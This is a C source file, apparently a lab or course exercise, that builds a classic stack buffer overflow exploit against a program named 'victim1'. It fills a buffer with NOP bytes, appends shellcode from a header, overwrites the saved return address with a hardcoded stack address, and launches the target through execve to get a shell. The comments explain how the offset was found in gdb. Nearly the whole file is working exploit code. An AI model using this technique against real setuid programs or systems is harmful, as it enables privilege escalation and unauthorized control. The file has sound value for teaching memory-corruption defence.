#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include "shellcode.h"

int main(int argc, char *argv[])
{
  char *args[3];
  char *env[1];

  if (argc != 2) {
    fprintf(stderr, "Usage: %s /path/to/victim1\n", argv[0]);
    exit(EXIT_FAILURE);
  }

/*
 * Victim1 has a classic strcpy() overflow that allows us to overflow as far as we want
 * 	the end goal is to overflow the EIP on the stack to reroute the return address
 * 	to point to the start of our exploit string and run the shell
 *
 * We achieve this by filling our buffer of 128 with NOPs and inserting the shell code
 * 	at the very end of the string. Beyond that is the offset and then our return
 * 	address.
 *
 * The offset was found by running the victim in gdb with an input of 
 * 	
 * 	"A"*128 + "B"*16
 *
 * 	I just kept incrementing B until the return address of the SIGSEGV was '0x42424242'
 * 		which indicated I was at the roght spot
 *
 * Then I just had to find an address that landed us somewhere int he NOPs
 *
 *
 * - STACK MEMORY -
 *
 * Overflow Direction
 * ----------------------------->|   |
 *  
 * x Bytes                   4B   4B
 * [STACK                  ][EBP][EIP]
 *
 */


// Address of out + 12 = address of leave
#define EXPLEN 145 //128 buffer + offset + NULL
#define BUFLEN 128
  char exp_str[EXPLEN];

  // Assemble your exploit string here
  memset(exp_str, 0x90, EXPLEN-1); // Fill with NOP

  // Copy shellcode into end of exp_str - offset + NULL
  strcpy(exp_str + (EXPLEN - strlen(shellcode) - (EXPLEN - BUFLEN)), shellcode);
  
  // Remove NULL Term from shellcode
  *(unsigned long *)(exp_str + BUFLEN) = 0x90909090; 

  // Insert new EIP address to overflow to
  *(unsigned long *)(exp_str + (EXPLEN - 5)) = 0xbffffd30; // Point return address at exp_str
  exp_str[EXPLEN - 1] = 0; //NULL terminate
  
  args[0] = argv[1];
  args[1] = exp_str;
  args[2] = NULL;
  env[0] = NULL;

  if (execve(argv[1], args, env) < 0)
    err(EXIT_FAILURE, "Cannot execute %s", argv[1]);
  return EXIT_SUCCESS;
}
